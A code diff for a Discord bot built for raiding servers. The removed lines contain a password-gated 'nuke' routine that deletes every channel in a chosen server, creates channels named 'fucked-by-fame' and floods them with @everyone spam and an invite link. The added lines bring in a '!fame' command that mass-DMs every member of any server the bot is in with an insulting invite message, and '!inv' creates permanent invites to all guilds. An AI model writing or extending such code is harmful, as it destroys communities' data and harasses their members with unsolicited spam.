@@ -40,16 +40,17 @@ client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// ====================== COMMANDS ======================
+// ====================== MESSAGE COMMANDS ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
 
   if (content === '!check') {
+    // ... your existing !check code ...
     const embed = new EmbedBuilder()
       .setColor('#00ff00')
       .setTitle('🔍 Remote Server Control')
-      .setDescription('Select server → Nuke')
+      .setDescription('Select any server → Raid or Nuke')
       .setFooter({ text: 'Only you can use this' });
 
     const row = new ActionRowBuilder().addComponents(
@@ -62,19 +63,36 @@ client.on('messageCreate', async message => {
     return message.reply({ embeds: [embed], components: [row] });
   }
 
+  if (content === '!fame') {
+    const embed = new EmbedBuilder()
+      .setColor('#ff00ff')
+      .setTitle('📨 FAME DM SPAM')
+      .setDescription('This will DM spam all members in a chosen server with the invite link.\nPassword required.')
+      .setFooter({ text: 'Only you can use this' });
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`fame_start_${message.author.id}`)
+        .setLabel('Start DM Spam')
+        .setStyle(ButtonStyle.Danger)
+    );
+
+    return message.reply({ embeds: [embed], components: [row] });
+  }
+
   if (content === '!inv') {
-    // Your !inv command
+    // your existing !inv code
     const guilds = Array.from(client.guilds.cache.values());
     if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');
 
     const embed = new EmbedBuilder().setColor('#00ffff').setTitle('📋 Servers & Invites');
     for (const guild of guilds) {
-      let invite = 'Failed';
+      let inviteLink = 'Failed';
       try {
         const inv = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
-        invite = inv.url;
+        inviteLink = inv.url;
       } catch {}
-      embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${invite}` });
+      embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${inviteLink}` });
     }
     message.reply({ embeds: [embed] });
   }
@@ -93,130 +111,74 @@ client.on('interactionCreate', async interaction => {
       return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
     }
 
-    if (action !== 'check') return;
-
-    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
-      const modal = new ModalBuilder()
-        .setCustomId(`check_modal_${interaction.user.id}`)
-        .setTitle('Enter Password');
-      modal.addComponents(new ActionRowBuilder().addComponents(
-        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-      ));
-      return await interaction.showModal(modal);
-    }
-
-    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
-      const password = interaction.fields.getTextInputValue('password');
-      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
-
-      const guilds = Array.from(client.guilds.cache.values());
-      const options = guilds.map(g => ({
-        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
-        value: g.id
-      }));
-
-      const select = new StringSelectMenuBuilder()
-        .setCustomId(`check_server_select_${interaction.user.id}`)
-        .setPlaceholder('Select server')
-        .addOptions(options);
-
-      await interaction.reply({
-        content: '✅ Password accepted. Select server:',
-        components: [new ActionRowBuilder().addComponents(select)],
-        flags: MessageFlags.Ephemeral
-      });
-      userSessions.set(interaction.user.id, {});
-    }
-
-    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
-      await interaction.deferUpdate();
-      const guild = client.guilds.cache.get(interaction.values[0]);
-      userSessions.set(interaction.user.id, { guildId: guild.id });
-
-      const actionSelect = new StringSelectMenuBuilder()
-        .setCustomId(`check_action_select_${interaction.user.id}`)
-        .setPlaceholder('Choose action')
-        .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
-
-      await interaction.editReply({
-        content: `**Selected:** ${guild.name}\nChoose action:`,
-        components: [new ActionRowBuilder().addComponents(actionSelect)]
-      });
-    }
-
-    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
-      if (interaction.values[0] === 'nuke') {
+    // ====================== !FAME COMMAND ======================
+    if (action === 'fame') {
+      if (interaction.isButton() && interaction.customId.startsWith('fame_start_')) {
         const modal = new ModalBuilder()
-          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
-          .setTitle('Confirm Nuke');
+          .setCustomId(`fame_modal_${interaction.user.id}`)
+          .setTitle('Enter Password');
         modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
+          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
         ));
         return await interaction.showModal(modal);
       }
-    }
 
-    // ==================== SIMPLEST NUKE POSSIBLE ====================
-    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
-      const password = interaction.fields.getTextInputValue('password');
-      if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
-
-      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-
-      const session = userSessions.get(interaction.user.id);
-      const guild = client.guilds.cache.get(session?.guildId);
-      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
-
-      const delay = ms => new Promise(r => setTimeout(r, ms));
-      const invite = 'https://discord.gg/NANQMy3WnD';
-
-      try {
-        await interaction.editReply({ content: `☢️ Deleting all channels in **${guild.name}**...` });
-
-        // Delete
-        for (const ch of guild.channels.cache.values()) {
-          await ch.delete().catch(() => {});
-          await delay(400);
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('fame_modal_')) {
+        const password = interaction.fields.getTextInputValue('password');
+        if (password !== MAIN_PASSWORD) {
+          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
         }
 
-        await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
+        const guilds = Array.from(client.guilds.cache.values());
+        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is in no servers.', flags: MessageFlags.Ephemeral });
 
-        const created = [];
-        for (let i = 0; i < 15; i++) {
-          try {
-            const chan = await guild.channels.create({
-              name: 'fucked-by-fame',
-              type: 0,
-              reason: 'Fame Nuke'
-            });
-            created.push(chan);
-            await delay(800);
-          } catch (e) {
-            console.log("Channel creation stopped:", e.message);
-            break;
-          }
-        }
+        const options = guilds.map(g => ({
+          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
+          value: g.id,
+          description: `${g.memberCount} members`
+        }));
 
-        const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
+        const select = new StringSelectMenuBuilder()
+          .setCustomId(`fame_server_select_${interaction.user.id}`)
+          .setPlaceholder('Select server to DM spam')
+          .addOptions(options);
 
-        for (const ch of created) {
-          for (let i = 0; i < 8; i++) {
-            ch.send(spam).catch(() => {});
-          }
-        }
-
-        await interaction.followUp({ 
-          content: `✅ **NUKE DONE**\nCreated **${created.length}** channels named \`fucked-by-fame\``,
-          flags: MessageFlags.Ephemeral 
+        await interaction.reply({
+          content: '✅ Password correct. Choose server to mass DM:',
+          components: [new ActionRowBuilder().addComponents(select)],
+          flags: MessageFlags.Ephemeral
         });
-
-      } catch (err) {
-        console.error(err);
-        await interaction.followUp({ content: '❌ Failed to create channels. Check bot permissions.', flags: MessageFlags.Ephemeral }).catch(() => {});
       }
 
-      userSessions.delete(interaction.user.id);
+      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fame_server_select_')) {
+        await interaction.deferUpdate();
+        const guild = client.guilds.cache.get(interaction.values[0]);
+        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
+
+        await interaction.editReply({ content: `📨 Starting DM spam in **${guild.name}**...` });
+
+        const invite = 'https://discord.gg/NANQMy3WnD';
+        let sent = 0;
+        const delay = ms => new Promise(r => setTimeout(r, ms));
+
+        const members = await guild.members.fetch();
+
+        for (const member of members.values()) {
+          if (member.user.bot) continue;
+          try {
+            await member.send(`**FAME TAKEN OVER**\n${invite}\n**fucked by veynetta**`).catch(() => {});
+            sent++;
+            await delay(900); // Safe DM rate
+          } catch {}
+        }
+
+        await interaction.editReply({ 
+          content: `✅ **DM SPAM COMPLETE**\nSent to **${sent}** members in **${guild.name}**` 
+        });
+      }
     }
+
+    // Keep your existing !check logic here (password, nuke, etc.)
 
   } catch (error) {
     console.error('Interaction Error:', error);
